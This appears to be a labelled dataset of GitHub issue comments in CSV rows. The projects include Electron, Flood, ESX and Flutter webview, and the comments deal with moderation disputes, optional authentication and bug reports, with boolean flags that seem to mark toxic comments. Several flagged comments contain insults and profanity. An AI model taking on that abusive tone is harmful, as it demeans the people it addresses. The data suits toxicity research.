electron/electron/17171/469483441,"@friend, thanks for helping to make Electron better and especially the detailed bug report. You've made it very clear that this issue being fixed is important to you. Open source is tricky, and I understand that relying heavily on a project like Electron can be scary, frustrating, and confusing. We do not want to break anyones apps. None of the maintainers want that. We even run a program to help ensure we fix participating app's major issues during our beta cycle. However, because of the Electron maintainers' limited time and resources, we can't get to everything immediately and some things we can't get to for an extended period. This is common in open source projects. Repeatedly commenting with no new information and ""shouting"" at the development team by using all caps is not something we do here. Moving forward, I would recommend reading and following the advice in Creators, contributors, and collaborators. Just to be clear, you are welcome to continue participating in the following ways  submitting bug reports with enough detail to reproduce - ideally a Fiddle example a new feature request with context logistical questions that may not be covered in the docs (e.g. asking about release timelines in a polite way)  Including additional comments in all caps or responding repeatedly with requests of the maintainer team are off-topic and will result in those issues being closed immediately. Please follow the next step exactly Let's all take a moment to digest the above. Please do not interact with the project for 24-hours. No comments, new issues, or pull-requests. After that, please look through your open issues and edit them to ensure they're entirely on-topic, and we can continue the discussion here about the best way to engage going forward. ",False,True,False,electron/electron/17171
electron/electron/17171/474285427,I was expecting better\polite replies.I understand its an open forum.I didn't feel like it was a conversation.I don't expect anything at all now..Cheers ,False,True,False,electron/electron/17171
emacs-evil-anzu/syohex/3/70853660,Thanks!!!! ,False,True,False,emacs-evil-anzu/syohex/3
electron/electron/17171/474130777,You don't care about issue and I wasted my time reporting this issue.I fixed it myself.Thanks for teaching me the rules and the ways not to help....Live in the rules and world of arrogance ,True,True,False,electron/electron/17171
electron/electron/17171/474562665,"@friend, we're glad to hear that you were able to find a solution to the problem you experienced. On the other hand, claiming that people don't care or that they're arrogant are specifically against the Electron Code of Conduct. Continuing with this type of behavior or further violations of the code of conduct will result in you being blocked from the Electron organization. Additionally, because we believe that further communication on this issue will only result in escalating tensions, we're going to lock the conversation. ",False,True,False,electron/electron/17171
emacs-evil-anzu/syohex/3/55030255,Only tested on emacs HEAD. Fixes [#2] ,False,True,False,emacs-evil-anzu/syohex/3
emacs-evil-anzu/syohex/3/71001316,@friend I added you to collaborator of this package. ,False,True,False,emacs-evil-anzu/syohex/3
esx_policejob/ESX-Org/104/398835905,"This is not an issue with the script. Ask for help somewhere else, e.g the ESX discord. ",False,True,False,esx_policejob/ESX-Org/104
ember-web-app/zonkyio/129/432382941,"Bumps ember-cli-addon-tests from 0.11.0 to 0.11.1. &lt;details&gt; &lt;summary&gt;Release notes&lt;/summary&gt;  *Sourced from [ember-cli-addon-tests's releases]( []( 0.11.1 - []( Merge pull request [#208]( from kiwiupover/test-against-ember-data-release - []( Use ember-data@friend.8 from NPM, not github. - []( use npm 6 in appveyor - []( Use emberjs/data#v3.8.0 for ember-data version - []( drop node 4 from appveyor test metrix - []( Force npm 6 or higher - []( Remove the npm3 requirement in CI - []( Use ember-data version from npm - []( Run tests againt ember-data@friend.8.0 - Additional commits viewable in [compare view]( changes&lt;/summary&gt;  This version was pushed to npm by [rwjblue]( a new releaser for ember-cli-addon-tests since your current version. &lt;/details&gt; &lt;br /&gt;  [![Dependabot compatibility score]( will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting .  [//] # (dependabot-automerge-start) Dependabot will **not** automatically merge this PR because this dependency is pre-1.0.0.  [//] # (dependabot-automerge-end)  ---  &lt;details&gt; &lt;summary&gt;Dependabot commands and options&lt;/summary&gt; &lt;br /&gt;  You can trigger Dependabot actions by commenting on this PR -  will rebase this PR -  will recreate this PR, overwriting any edits that have been made to it -  will merge this PR after your CI passes on it -  will squash and merge this PR after your CI passes on it -  will cancel a previously requested merge and block automerging -  will reopen this PR if it is closed -  will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself) -  will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself) -  will set the current labels as the default for future PRs for this repo and language -  will set the current reviewers as the default for future PRs for this repo and language -  will set the current assignees as the default for future PRs for this repo and language -  will set the current milestone as the default for future PRs for this repo and language -  will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme  Additionally, you can set the following in your Dependabot [dashboard]( Update frequency (including time of day and day of week) - Automerge options (never/patch/minor, and dev/runtime dependencies) - Pull request limits (per update run and/or open at any time) - Out-of-range updates (receive only lockfile updates, if desired) - Security updates (receive only security updates, if desired)  Finally, you can contact us by mentioning @friend.  &lt;/details&gt;",False,True,False,ember-web-app/zonkyio/129
esx_policejob/ESX-Org/104/398968369,"You open ISSUES here on github, it id NOT the place to ask for help, understand?! ",False,True,False,esx_policejob/ESX-Org/104
esx_policejob/ESX-Org/104/333927052,"Anyone able to help with this I know the state of a vehicle needs to be set to ""0"" in order for it to be impounded and wanted to know if you could help out with adding this into the script I cant seem to get it to work. Thanks ",False,True,False,esx_policejob/ESX-Org/104
esx_policejob/ESX-Org/104/398933019,yea see I ask for help somewhere else and because the player base for this just want to charge each other for a line of fucking code. So there is no use is asking on there it will get ignored or someone will ask for money so....... ,False,True,False,esx_policejob/ESX-Org/104
enroll/dchbx/2592/418038050," Welcome to Depfu 👋 This is one of the first three pull requests with dependency updates we've sent your way. We tried to start with a few easy patch-level updates. Hopefully your tests will pass and you can merge this pull request without too much risk. This should give you an idea how Depfu works in general. After you merge your first pull request, we'll send you a few more. We'll never open more than seven PRs at the same time so you're not getting overwhelmed with updates. Let us know if you have any questions. Thanks so much for giving Depfu a try!  &lt;hr&gt;  🚨 &lt;b&gt;Your version of sprockets has known security vulnerabilities&lt;/b&gt; 🚨 Advisory CVE-2018-3760 Disclosed June 19, 2018 URL  Traversal in Sprockets&lt;/summary&gt; &lt;blockquote&gt;   &lt;p&gt;Specially crafted requests can be used to access files that exist on&lt;br&gt; the filesystem that is outside an application's root directory, when the&lt;br&gt; Sprockets server is used in production.&lt;/p&gt; &lt;p&gt;All users running an affected release should either upgrade or use one of the work arounds immediately.&lt;/p&gt; &lt;p&gt;Workaround&lt;br&gt; In Rails applications, work around this issue, set &lt;code&gt;config.assets.compile = false&lt;/code&gt; and&lt;br&gt; &lt;code&gt;config.public_file_server.enabled = true&lt;/code&gt; in an initializer and precompile the assets.&lt;/p&gt; &lt;p&gt;This work around will not be possible in all hosting environments and upgrading is advised.&lt;/p&gt; &lt;/blockquote&gt; &lt;/details&gt; &lt;br&gt; 🚨 &lt;b&gt;We recommend to merge and deploy this update as soon as possible!&lt;/b&gt; 🚨 &lt;hr&gt;   Here is everything you need to know about this update. Please take a good look at what changed and the test results before merging this pull request.  ### What changed?   #### ✳️ sprockets (2.12.4 → 2.12.5) · [Repo]( · [Changelog]( ↗️ rack (_indirect_, 1.6.9 → 1.6.11) · [Repo]( · [Changelog]( href="" the full diff on Github&lt;/a&gt;. The new version differs by 7 commits&lt;/p&gt;  &lt;ul&gt; &lt;li&gt;&lt;a href="" version for release&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" http/https schemes&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" pull request #1296 from tomelm/fix-prefers-plaintext&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" version for release&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" pull request #1249 from mclark/handle-invalid-method-parameters&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" failure to upcase invalid strings&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" with a passing version of Rubygems and bundler&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/details&gt;  Depfu will automatically keep this PR conflict-free, as long as you don't add any commits to this branch yourself. You can also trigger a rebase manually by commenting with . &lt;details&gt;&lt;summary&gt;All Depfu comment commands&lt;/summary&gt; &lt;blockquote&gt;&lt;dl&gt; &lt;dt&gt;@​depfu rebase&lt;/dt&gt;&lt;dd&gt;Rebases against your default branch and redoes this update&lt;/dd&gt; &lt;dt&gt;@​depfu merge&lt;/dt&gt;&lt;dd&gt;Merges this PR once your tests are passing and conflicts are resolved&lt;/dd&gt; &lt;dt&gt;@​depfu reopen&lt;/dt&gt;&lt;dd&gt;Restores the branch and reopens this PR (if it's closed)&lt;/dd&gt; &lt;dt&gt;@​depfu pause&lt;/dt&gt;&lt;dd&gt;Ignores all future updates for this dependency and closes this PR&lt;/dd&gt; &lt;dt&gt;@​depfu pause [minor|major]&lt;/dt&gt;&lt;dd&gt;Ignores all future minor/major updates for this dependency and closes this PR&lt;/dd&gt; &lt;dt&gt;@​depfu resume&lt;/dt&gt;&lt;dd&gt;Future versions of this dependency will create PRs again (leaves this PR as is)&lt;/dd&gt; &lt;/dl&gt;&lt;/blockquote&gt; &lt;/details&gt;",False,True,False,enroll/dchbx/2592
esx_policejob/ESX-Org/104/399096546,No I don't write LUA is a useless language... your one to talk about getting mad but you are an example of your own shit player base. You don't offer any assistance to questions you just get pissed when someone asks for help. Maybe you wouldent have these issues if you actually supported your work assisted others in improving it rather then acting like the child you are ,True,True,False,esx_policejob/ESX-Org/104
esx_policejob/ESX-Org/104/399112862,"you're useless, now fuck off ",True,True,False,esx_policejob/ESX-Org/104
flood/jfurrow/240/204797360,I know this is well rooted in your app but I would very much like to disable auth / passport and use basic auth on my reverse proxy instead. Thanks! ,False,True,False,flood/jfurrow/240
explore/justina444/6/438625874,"Bumps rubocop from 0.63.1 to 0.68.0. &lt;details&gt; &lt;summary&gt;Release notes&lt;/summary&gt;  *Sourced from [rubocop's releases]( from [rubocop's changelog]( []( Cut 0.68 - []( Add HeredocMethodCallPosition cop - []( [Fix [#6822]( Fix Lint/LiteralInInterpolation autocorrection for single quotes ... - []( Fix a typo for  - []( [Fix [#6985]( Fix Lint/LiteralInInterpolation's autocorrect  ([#6986]( []( NodePattern Fix $\&lt;&gt; - []( Add always_braces to Style/BlockDelimiters - []( Fix edge case bugs for HeredocArgumentClosingParenthesis - []( Rename IndentArray and IndentHash to IndentFirst*Element - []( Add obsolete message for renaming  - Additional commits viewable in [compare view]( /&gt;  [![Dependabot compatibility score]( will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting .  [//] # (dependabot-automerge-start) [//] # (dependabot-automerge-end)  ---  &lt;details&gt; &lt;summary&gt;Dependabot commands and options&lt;/summary&gt; &lt;br /&gt;  You can trigger Dependabot actions by commenting on this PR -  will rebase this PR -  will recreate this PR, overwriting any edits that have been made to it -  will merge this PR after your CI passes on it -  will squash and merge this PR after your CI passes on it -  will cancel a previously requested merge and block automerging -  will reopen this PR if it is closed -  will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself) -  will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself) -  will set the current labels as the default for future PRs for this repo and language -  will set the current reviewers as the default for future PRs for this repo and language -  will set the current assignees as the default for future PRs for this repo and language -  will set the current milestone as the default for future PRs for this repo and language -  will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme  Additionally, you can set the following in your Dependabot [dashboard]( Update frequency (including time of day and day of week) - Automerge options (never/patch/minor, and dev/runtime dependencies) - Pull request limits (per update run and/or open at any time) - Out-of-range updates (receive only lockfile updates, if desired) - Security updates (receive only security updates, if desired)  Finally, you can contact us by mentioning @friend.  &lt;/details&gt;",False,True,False,explore/justina444/6
flood/jfurrow/240/277016960,"I'll consider making this optional in the future, but I think the vast majority of users benefit from the included authentication. Right now there are higher priority issues for me to work on, but if any of you are willing to submit a PR for optional JWT authentication, I'll gladly review it! ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/277031904,OP You can always use a basic auth before accessing the flood login #useless ,True,True,False,flood/jfurrow/240
flood/jfurrow/240/277157508,"I'm going to close this for now, but feel free to submit a PR for optional JWT auth! ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/295310720,"I'm reopening this as it's been requested by multiple users. Let's make the authentication optional, but enabled by default. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/337973226,"An simple and optional config value in config.js with something like  (which defaults to true if not defined) would be very nice indeed. In my case I'm hideing most stuff behind an reverse proxy with 2FA, so additional authentication in Flood is just cumbersome smile ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/338082322,"Might be easy to just pass plaintext credentials to the server behind the scenes if an option in the config (like mentioned above) is set, this removes any potential exploit that may arise from editing the security system to allow for sessions to be generated without proper authentication. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/338082580,"FWIW, the passphrase can be left blank as is. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/338181833,"Bonus, just pass the username then. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/372888543,"Hoping to help revive an older thread. While I don't know enough to help code this, I would definitely like to see this. As someone already mentioned, I have better auth already built into my nginx RP setup. I'd love to be able to remove the extra auth screen. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/373260889,"The simplest approach for this might be to have the config file provide some ""defaulted"" credentials and an immediate re-direct. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/373477976,I think this is the better approach. Because making some default credentials and a lot of users will never change them. Make them forced to change the password bu the default account name will be the same everywhere and bad guy will have no pain to bruteforce weak password. It's maybe more work do make authentication optional but it seems more secure than providing default credentials. And this will be cleaner. ,False,True,False,flood/jfurrow/240
flood/jfurrow/240/377079180,"from a security standpoint would you say the flood login is tamper proof? if you cannot say „yes“ being 100% sure about it, making this optional might be a wise decision. i'll most likely audit the login part of floods code in a few days. after all i run this publically available on my homeserver with just an nginx with basic auth in front of it. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/377113867,"@friend No, unfortunately I cannot say with any confidence that Flood is 100% tamper proof. I'm not a security expert, so your audit would be greatly appreciated! Let's hope so! 🤞 ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/377287057,"From my POV, I don't see the interest of disabling Flood auth for enabling basic auth in most cases except for hiding the app when it is exposed on internet. To get a stronger auth system a nice idea the user can deploy, is desabling Flood auth (when it will be available) and configure Client Side Certificate Authentication. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/377311433,"I think It would be better to allow Flood to trust the reverse proxy in front of it (if any). We could use it for exemple if we have some kind of auth in front of it (Basic/SAML/Certificate, whatever, you name it), it would be good to be able to use it for the fearue #216 ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/377378745,so far my audit tells me you have pretty old dependencies in use.♠passportpassport-jwt` are what you use for authentication. fine by me but not up2date. feel free to test and merge this pull request  i could not upgrade from webpack 3 to 4 aswell as react 15 to 16 and d3 from 3 to 5 without actually doing big changes to the code base. but oh well.. looking good so far. hint hint node-check-updates ,False,True,False,flood/jfurrow/240
flood/jfurrow/240/391799933,"Note by disabling user authentication (IF you don't replace it with another authentication method like PAM for example) you will also disable multi-user capabilities. So if you have 3 users and you suddenly change the config to disable authentication, what should happen? Keep the 1st user and remove all others? No, this is nonsense. I think it should not be possible to disable authentication but only to switch to another mechanism like PAM or authentication forwarding to a reverse proxy like nginx. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/391801409,I don't think that the debate should be around disabling authentication but rather for supporting Alternative authentication methods. What do you think @friend ,False,True,False,flood/jfurrow/240
flood/jfurrow/240/391806687,What if you don't use the multi-user feature (they all show the same torrent list anyway). No point in password protection if the Flood instance is local only and not accessible externally. ,False,True,False,flood/jfurrow/240
flood/jfurrow/240/392295135,"nginx auth_request works fine btw.  just a bit hard to setup because you either have to setup a third party SSO provider, self host one or build one yourself. i kinda did the self made route now. totally better than basic auth since it does not prompt you for login if you get a 401 from flood ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/412890829,"@friend Personally, I think all services should have authentication, even if it is only LAN? DNS rebinding could well come into this ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/412894116,that's why i'd recommend using nginx auth_request for all your home hosted things and do an internal redirect that's dns independent. ,False,True,False,flood/jfurrow/240
flood/jfurrow/240/412895084,"I think the bigger point here would be to create the option. To each his own on CHOOSING their level of security. Setting a responsible default, is on the developer to ""do security right"", but creating the options that the users are looking for, is on the developer to ""create good/flexible software"". In this case, many of us are using some other mechanism to restrict access - or some don't want auth, period. Anyone making these decisions takes the risk balance into their own hands when changing from the responsible default setting. It's sort of like saying Windows shouldn't have an option to disable a password authentication to the machine. But there are use cases that dictate or necessitate the need of such a practice. In my scenario, I'm using nginx to redirect to an auth server/service before anyone gains access to anything on the domain. So DNS rebinding is not an issue in this case, and auth is not a security issue as I've setup a different auth. For me, I'd to access this service without ANOTHER login required, even if it is typing admin with no password. The user experience is undesirable. And let's be honest, these days UX trumps all! 😆 ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/412904474,@friend @friend Agreed. Does ruTorrent support multiple auth types? I've only used it with basic_auth. ,False,True,False,flood/jfurrow/240
flood/jfurrow/240/412905426,"I think this is no more a discussion, we more or less all agree that authentication should be enable by default and can be made optional bu user. I'm not a dev, I don't know anything about node.js, I'm only here to manage issues. Jfurrow is the main dev but he is very busy and have only a few hours a month for this project. Remember this is an open source project and that all contributions are made by member on their free time, so anyone wanting this feature can make a PR. We would proudly review and merge it. ",False,True,False,flood/jfurrow/240
flood/jfurrow/240/412906151,"Agreed - is there a way to just lock this thread? This way it doesn't go on, but can still be managed by the repo as a an enhancement, per the labeling? ",False,True,False,flood/jfurrow/240
flood/jfurrow/758/403273798, Is this expected on a mobile device? Not very usable. ,False,True,False,flood/jfurrow/758
flood/jfurrow/758/457699965,"Hi @friend Thanks for posting your issue, but can you please take time to edit it in order to fill the issue template. I'm closing the issue until you fill it. Feel free to ask to re-open it as soon as it's done. ",False,True,False,flood/jfurrow/758
flood/jfurrow/758/457812307,@friend it’s quite usable in landscape. Portrait indeed makes things hard. ,False,True,False,flood/jfurrow/758
flood/jfurrow/758/457859322,"Consider a smaller template, that is little much if want people to fill it out...for little issues like this. Also just be aware that no one gets the issue templates when they use a mobile device ",False,True,False,flood/jfurrow/758
flood/jfurrow/758/457859780,Is it like this for all mobile devices? Is there no proper mobile views?? ,False,True,False,flood/jfurrow/758
flood/jfurrow/758/457861534,"@friend done. Consider forking this project if you're a react dev because it appears to be dead. From experience, it's unlikely Jfurrow it's going to work on this again. I know that he wants to and doesn't want to 'give up', but it's not going to happen. I'm not sure continuing development in a repo under his name would be the best idea unless you have admin rights. It's going to be hard to find contributors at this point anyway, so idk if it's worth it. ",False,True,False,flood/jfurrow/758
flood/jfurrow/758/457869225,"@friend All our template are very small except the bug one that is medium size but all info are required to troubleshoot correctly, sorry. Flood is installed on a server (or more rarely a computer), you are troubleshooting on either the server or the computer, you're expected to fill the issue on your computer not your mobile device. And it is a github issue if issue template are not displaying on mobile not a flood one. No done, please fill Your Environment correctly. ♠masterlatestN.A.`. ",False,True,False,flood/jfurrow/758
flood/jfurrow/758/457869384,"@friend Please also read the CODE_OF_CONDUCT and do not PM people on discord, you have the issue tracker and the discord server to do so. ",False,True,False,flood/jfurrow/758
flood/jfurrow/758/457869908,"@friend 1) This is not the right issue to talk about that, let's talk in #672 and #712 2) Rather than inviting people to fork ask them to join the Organization (see #672) and ask @friend to transfer this repository to the organization ",False,True,False,flood/jfurrow/758
flood/jfurrow/758/457907611,"I use docker, yes I build it from master everyday. Honestly my OS and version, etc don't matter as this is clearly not environment specific or version specific and I use docker.... I don't know what you are talking about with discord....I didn't message anyone. It's clear that development is all but dead and getting petty over issue templates when this is clearly an issue with enough info really puts me off. Instead of fixing things, you want to be pedantic over what are simple bugs. I'm done with this project. ",True,True,False,flood/jfurrow/758
flood/jfurrow/758/457914398,"@friend So you should have write docker before, this is clearly important. False, commit id is important because you can talk about something already fixed for example, and yes environment and version are important because it can change the version of dependencies, that can change the final output or break something. Still nodejs 11.x or latest is not a version, for example  is. Also npm version is different from nodejs version, npm 11 doesn't even exist, for example I have npm . Sorry for discord I thought it was you, timing coincidence  1) Yes development is quite dead because there is only 1 dev that is @friend, I'm not a dev I'm just here to help managing issues, project management and gibing security advice. 2) No, there was not enough information, as I said commit ID, node and npm version and OS are very important even if you don't understand why. Without that it is impossible to troubleshoot. 3) Yes I won't fix this because I'm not a dev. I know a little about ruby but nothing about javascript. 4) I'm not pedantic, I'm assuring there is enough information to troubleshot, because just saying ""It won't work"" or just pasting a screenshot is clearly not enough to do anything. 5) I'm sorry but I'm spending my free time here just to help and you are very aggressive with me. Also this is a free, libre and open-source project, not a proprietary and paid product where you bought some support or anything. There is no warranty. If you think that development is to slow, please learn the JavaScript language and come help @friend. 6) About the template being to heavy that's why we slit issues by category. Here, we know now this is not a bug, so you should have open a Feature Request issue with a much lighter template. I'm sorry I'll lock this conversation as this is just you being aggressive and not constructive and violating the code of conduct. ",False,True,False,flood/jfurrow/758
flutter_webview_plugin/dart-flitter/60/312526026,"Hi, how can I open a file that is locally stored on the device? For example, if the file index.html is located inside my project's assets folder? ",False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/379897236,"I have exactly the same requirement. i need to load a react app that is stored locally.  Its actually some very complex JS that i cant rewrite in Dart. It does CRDT stuff. Once loaded i need to call certain public exported JavaScript functions. Wondering if i can use EvalJavascript Dart call.  I also need to receive calls from inside the Webview to Dart - not sure how to do that, other than polling which is pretty bad and will kill battery. ",False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/379912974,I need to open a PDF file. I was thinking of doing it with a WebView. Would this be possible? ,False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/379933947,"@friend I tried that out, it wouldn't work unless if you feed a gdoc url to the method as such ("" + pdfURL). But isn't very suitable for mobile, the gdocs site has additional icons which ruin the UI. Besides that my app also needs to work offline. So my workaround has been to convert the PDFs to HTML first. ",False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/379993470,"I found this today, we may be able to do this, but will require changes to the plugin. See  Another way that can work is to pass a url like ""file///data/data/com.provider.package/file_name.html"" but you will need the exact file path of the HTML. I didn't manage to do this though because my assets are inside the assets folder of my project, and those are not placed in any kind of permanent directory. ",False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/380017436,duplicate of  am closing this one since we already discussed about solution in the previous one ,False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/380024169,@friend  that solution isn't working well for me it seems. I'm getting this  (17795) Unrecognized GLES max version string in extensions E/flutter (17795) [ERRORtopaz/lib/tonic/logging/dart_error.cc(16)] Unhandled exception E/flutter (17795) Invalid argument(s) String contains invalid characters. E/flutter (17795) #0      _UnicodeSubsetEncoder.convert (dartconvert/ascii.dart979) E/flutter (17795) #1      AsciiCodec.encode (dartconvert/ascii.dart4746) E/flutter (17795) #2      new UriData.fromString (dartcore/uri.dart319744) E/flutter (17795) #3      new Uri.dataFromString (dartcore/uri.dart30424) E/flutter (17795) #4      _MyHomePageState.getUri.&lt;anonymous closure&gt; (file///home/maskys/webview_test/lib/main.dart5721) the widget webview remains white ,False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/380026123,I think that is triggering because my html file contains quote characters? ,False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/380030135,"isn't the quote characters, must be something else.. Possible all the special characters in the file or the square brackets. ",False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/380032696,"@friend Please reopen, the solution in #23 doesn't seem to be able to work for this use case. I will need to load various files which all contain image assets, special characters like © and other symbols. The easiest way imho is if we can figure out how to use the ""file///"" syntax to load files from the project's asset folder. ",False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/380036810,if you launch a web server you should not have problem here is an example ,False,True,False,flutter_webview_plugin/dart-flitter/60
flutter_webview_plugin/dart-flitter/60/380038425,"@friend even if the solution don't work for you, it is the same issue, please continue the conversation on the other one and try the solution of @friend describe in the article mention in the other issue ",False,True,False,flutter_webview_plugin/dart-flitter/60
for_testings/beubiJenkins/2305/226741453,"Approved by ""N/A"" on QEM. Comments 1 ",False,True,False,for_testings/beubiJenkins/2305
freeCodeCamp/freeCodeCamp/10163/170647469,  The MDN links and other help links do not show up on the beta site. Screenshot   Regular site  Beta site  ,False,True,False,freeCodeCamp/freeCodeCamp/10163
freeCodeCamp/freeCodeCamp/10163/239577470,"@friend Thanks for catching this. You don't have to use the issue template if it doesn't fit the issue, though. ",False,True,False,freeCodeCamp/freeCodeCamp/10163
freeCodeCamp/freeCodeCamp/10163/253330522,I'll take a stab at this assuming we still plan to have MDN links on the site. ,False,True,False,freeCodeCamp/freeCodeCamp/10163
freeCodeCamp/freeCodeCamp/10163/263988794,@friend Did you make any progress on this? ,False,True,False,freeCodeCamp/freeCodeCamp/10163
freeCodeCamp/freeCodeCamp/10163/269830587,Refer   up to the community. ,False,True,False,freeCodeCamp/freeCodeCamp/10163
freeCodeCamp/freeCodeCamp/10163/286142287,"I'd like to raise a few questions about this. Having looked at the hint structure, I think we should make some changes.  The hint currently accepts only plain-text whereas most of the MDN resources are links. The hint generates a toast to which we could add an action link, but I wonder if using a dropdown on the hint button might not be a better approach. Alternatively, if we could limit the number of hints on each exercise to 1 hint, we could do away with the toast and have a one-click hint button to open the resource in a new tab.  Thought on any of this? ",False,True,False,freeCodeCamp/freeCodeCamp/10163
freeCodeCamp/freeCodeCamp/10163/286375294,@friend Good suggestions 👍 I'm not really sure what the hints are supposed to be like. I believe the idea is that they should be like the hints on the forum. Should we close this in favour of ,False,True,False,freeCodeCamp/freeCodeCamp/10163
freeCodeCamp/freeCodeCamp/10163/286418314,Whoa. Hadn't seen that issue. Thanks @friend. Closing this is fine as long as we reference the MDN links needing to be added to staging in that other issue. 👍 ,False,True,False,freeCodeCamp/freeCodeCamp/10163
freeCodeCamp/freeCodeCamp/10163/286618557,Closing in favor of #13460 ,False,True,False,freeCodeCamp/freeCodeCamp/10163
frp/fatedier/477/261977190,"Issue is only used for submiting bug report and documents typo. If there are same issues or answers can be found in documents, we will close it directly. (为了节约时间，提高处理问题的效率，不按照格式填写的 issue 将会直接关闭。) Use the commands below to provide key information from your environment You do NOT have to include this information if this is a FEATURE REQUEST What version of frp are you using (./frpc -v or ./frps -v)? 最新master版(截至 20171002) What operating system and processor architecture are you using ()? GOARCH=""amd64"" GOBIN="""" GOEXE="""" GOHOSTARCH=""amd64"" GOHOSTOS=""linux"" GOOS=""linux"" GOPATH=""/home/forward/tools/gopkg"" GORACE="""" GOROOT=""/usr/local/go"" GOTOOLDIR=""/usr/local/go/pkg/tool/linux_amd64"" GCCGO=""gccgo"" CC=""gcc"" GOGCCFLAGS=""-fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=/tmp/go-build985044916=/tmp/go-build -gno-record-gcc-swit ches"" CXX=""g++"" CGO_ENABLED=""1"" CGO_CFLAGS=""-g -O2"" CGO_CPPFLAGS="""" CGO_CXXFLAGS=""-g -O2"" CGO_FFLAGS=""-g -O2"" CGO_LDFLAGS=""-g -O2"" PKG_CONFIG=""pkg-config"" Configures you used Steps to reproduce the issue 1. 2. 3. Describe the results you received 编译安装报错 cmd/frps/main.go6359 cannot use conf (type ""github.com/vaughan0/go-ini"".File) as type ""github.com/fatedier/frp/vendor/github.com/vaughan0/go-ini"".File in argument to config.LoadServerCommonConf make *** [frps] Error 2 make error Describe the results you expected Additional information you deem important (e.g. issue happens only occasionally) Can you point out what caused this issue (optional) ",False,True,False,frp/fatedier/477
full-stack-project/ga-wdi-boston/505/192752110,"So i had a table that I messed up, so I decided to drop it.. the table is gone, but the files are still in my folder. Now when i create a different table, I get an error during migration. rake aborted! StandardError An error has occurred, this and all later migrations canceled PGUndefinedTable ERROR  relation ""requests"" does not exist Is it ok to manually delete the migration files from the previous table from the project folder? The previous table is gone from the database and the schema. The only remains are the mess-ups that i made that are in the form of migration files. ",False,True,False,full-stack-project/ga-wdi-boston/505
full-stack-project/ga-wdi-boston/505/264165575,You can use . ,False,True,False,full-stack-project/ga-wdi-boston/505
full-stack-project/ga-wdi-boston/505/264187652,"no, still working on it ",False,True,False,full-stack-project/ga-wdi-boston/505
full-stack-project/ga-wdi-boston/505/264191045,"I deleted some migrations from the folder(via terminal) and bundle exec rake dbdrop, create, migrate. ",False,True,False,full-stack-project/ga-wdi-boston/505
fullcalendar/fullcalendar/3046/133451980,"Events in the first day, WITH END datetime set, are NOT displayed with defaultView 'agendaWeek'. This just happens in the first day, even if you change the ""firstDay"" parameter. If you click on Month View and go back to Week View, those ""hidden"" events are displayed. To verify it, just add in the following changes in the JSON example included in the download files JSON.HTML header { left 'prev,next today', center 'title', right 'month,agendaWeek,agendaDay' }, defaultView 'agendaWeek', EVENTS.JSON   {     ""title"" ""MY HIDDEN TITLE"",     ""start"" ""2016-01-10T103000-0500"",     ""end"" ""2016-01-10T123000-0500""   }, Then, try the same deleting the ""END"" line from events.json file, refresh the page, and the event will be displayed Obviously, this will happen replacing json file with a database module. Any idea to solve this? ",False,True,False,fullcalendar/fullcalendar/3046
fullcalendar/fullcalendar/3046/186749698,would you mind posting a JSBin with a recreation of the bug? instructions ,False,True,False,fullcalendar/fullcalendar/3046
